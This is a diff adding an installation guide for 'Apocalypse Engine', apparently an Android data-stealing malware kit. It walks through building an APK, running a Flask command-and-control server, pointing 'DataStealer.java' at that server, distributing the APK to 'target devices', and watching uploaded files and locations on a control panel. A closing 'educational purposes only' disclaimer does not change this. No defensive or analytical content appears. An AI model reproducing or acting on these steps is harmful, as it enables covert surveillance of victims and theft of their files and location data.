@@ -1,0 +1,24 @@
+Apocalypse Engine - Installation Guide
+
+1. BUILD THE APK:
+   - Run: chmod +x build_scripts/build_apk.sh
+   - Run: ./build_scripts/build_apk.sh
+
+2. SETUP SERVER:
+   - Install Python: sudo apt install python3 python3-pip
+   - Install Flask: pip3 install flask
+   - Run server: python3 control_server/server.py
+
+3. DEPLOYMENT:
+   - Change SERVER_URL in DataStealer.java to your server IP
+   - Rebuild APK
+   - Distribute APK to target devices
+
+4. ACCESS CONTROL PANEL:
+   - Open: http://yourserver:5000
+   - Monitor uploaded files and locations
+
+SECURITY WARNING:
+- This is for educational purposes only
+- Use responsibly and ethically
+- Illegal use may result in severe consequences
